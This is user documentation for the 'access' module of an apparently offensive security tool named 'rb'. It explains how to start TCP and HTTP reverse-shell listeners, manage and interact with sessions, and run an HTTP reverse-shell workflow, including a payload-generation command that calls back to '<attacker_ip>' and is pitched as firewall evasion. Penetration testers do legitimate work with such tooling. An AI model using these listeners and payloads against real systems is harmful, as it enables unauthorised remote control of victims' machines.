<div align="center">

# üîë Access Domain Documentation

## TL;DR
Everything about `rb access`: generating, managing, and interacting with remote shell sessions (TCP/HTTP) and listeners.

**Shell Lifecycle ‚Ä¢ Session Management ‚Ä¢ Interactions**

[Commands](#commands) ‚Ä¢ [Examples](#examples) ‚Ä¢ [Docs Index](./index.md) ‚Ä¢ [Root Docs](../../README.md)

</div>

---

<div align="right">

[‚¨Ü Back to Top](#-access-domain-documentation)

</div>

## Overview

The `access` domain is the central hub for managing remote connections, specifically focusing on the lifecycle of reverse shells. While the `exploit` domain handles payload generation (`exploit payload shell`), the `access` domain is where you **catch**, **manage**, and **interact** with those shells.

It integrates with the `exploit` domain's listeners and provides a unified interface for handling multiple sessions, whether they are traditional TCP socket shells or modern, firewall-bypassing HTTP reverse shells.

**Domain:** `access`

**Available Resources:**
- `shell` - Manage remote shell sessions and listeners

**Key Features:**
- **Unified Session Management**: Handle TCP and HTTP shells in one place.
- **Listener Orchestration**: Start and stop listeners for various protocols.
- **Interactive Shells**: Drop into a TUI-based interactive session.
- **Background Management**: List, kill, and monitor background sessions.

---

## Resource: `access shell`

**Description:** Manage remote shell sessions and listeners.

### Commands

#### 1. `create` - Create/Start a Listener

Start a listener to catch incoming reverse shells. This is often the first step before generating and executing a payload.

**Syntax:**
```bash
rb access shell create [host]:[port] [FLAGS]
```

**Arguments:**
- `[host]:[port]` - Bind address and port (e.g., `0.0.0.0:4444`, `10.0.0.1:8080`). Defaults to `0.0.0.0` if host is omitted.

**Flags:**
- `-p, --protocol <proto>` - Listener protocol: `tcp`, `http`
  - Default: `tcp`
- `--ssl` - Enable SSL/TLS (for HTTPS listeners or encrypted TCP)
- `--background` - Run listener in background (default is interactive if only one session expected)

**Examples:**

```bash
# Start a TCP listener on port 4444
rb access shell create 4444 --protocol tcp

# Start an HTTP listener on port 8080 (for http-shell payloads)
rb access shell create 0.0.0.0:8080 --protocol http

# HTTPS listener
rb access shell create 0.0.0.0:443 --protocol http --ssl
```

---

#### 2. `listen` - Alias for `create`

Synonym for `create`, often more intuitive for starting listeners.

**Syntax:**
```bash
rb access shell listen <port> [FLAGS]
```

**Examples:**

```bash
rb access shell listen 4444
rb access shell listen 8080 --protocol http
```

---

#### 3. `sessions` - List Active Sessions

Display a table of all active shell sessions (both TCP and HTTP).

**Syntax:**
```bash
rb access shell sessions
```

**Sample Output:**

```
Active Shell Sessions
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
ID  TYPE      TARGET IP       CONNECTED    LAST SEEN
1   tcp       10.10.10.5      00:05:23     Now
2   http      192.168.1.50    00:12:01     5s ago
3   http      192.168.1.51    00:01:45     15s ago
```

---

#### 4. `connect` - Interact with a Session

Drop into an interactive shell session.

**Syntax:**
```bash
rb access shell connect <session_id>
```

**Arguments:**
- `<session_id>` - The ID of the session to connect to (from `sessions` list).

**Examples:**

```bash
rb access shell connect 1
```

**Interaction Notes:**
- **TCP Shells**: Provides a raw socket connection. You may need to upgrade to a PTY (e.g., using python pty module) for a full terminal experience.
- **HTTP Shells**: Provides a pseudo-shell interface where commands are queued for the target to poll. Output is displayed asynchronously.

---

#### 5. `kill` - Terminate a Session

Close an active session.

**Syntax:**
```bash
rb access shell kill <session_id>
```

**Examples:**

```bash
rb access shell kill 2
```

---

## HTTP Reverse Shell Architecture

The `access` domain's HTTP listener works in tandem with the `http-shell` payloads generated by the `exploit` domain.

**Workflow:**
1. **Start HTTP Listener:** `rb access shell listen 8080 --protocol http`
2. **Generate Payload:** `rb exploit payload http-shell --lhost <attacker_ip> --lport 8080`
3. **Execute Payload:** Run the payload on the target.
4. **Session Registration:** The target connects back to the listener, registering a new session.
5. **Polling:** The target periodically polls `/cmd/<id>` for instructions.
6. **Interaction:** You run `rb access shell connect <id>`. Your commands are queued. The target fetches them, executes, and POSTs results to `/output/<id>`.

**Benefits:**
- **Firewall Evasion:** Uses standard HTTP traffic (ports 80/8080/443).
- **Resilience:** Stateless connection; if the network drops, the shell resumes when connectivity returns.

---

## See Also

- [EXPLOIT Domain Documentation](./exploit.md) - Payload generation (`shell`, `http-shell`, `privesc`)
- [NETWORK Domain Documentation](./network.md) - Netcat replacement and connectivity
